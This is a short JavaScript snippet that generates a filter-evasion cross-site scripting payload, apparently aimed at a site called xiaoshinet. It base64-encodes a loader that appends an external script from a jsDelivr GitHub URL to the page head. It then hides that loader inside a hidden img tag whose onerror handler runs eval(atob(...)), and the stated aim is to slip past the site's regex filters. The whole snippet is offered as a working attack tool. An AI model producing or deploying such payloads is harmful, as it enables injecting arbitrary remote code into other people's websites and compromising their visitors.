//generate an javascript link to cheat the foolish regexes of xiaoshinet
link = "https://cdn.jsdelivr.net/gh/Kevin-HYX/B2402Pages/js/JsLeaders.js"
btoaed = btoa("var script = document.createElement('script');script.setAttribute('type','text/javascript');script.setAttribute('src',\""+link+"\");document.getElementsByTagName('head')[0].appendChild(script);")
cheatingLink = "<img hidden src = \"go_die_foolish_regexes\" onerror = \"eval(atob(\'"+btoaed+"\'))\">"
console.log(cheatingLink)
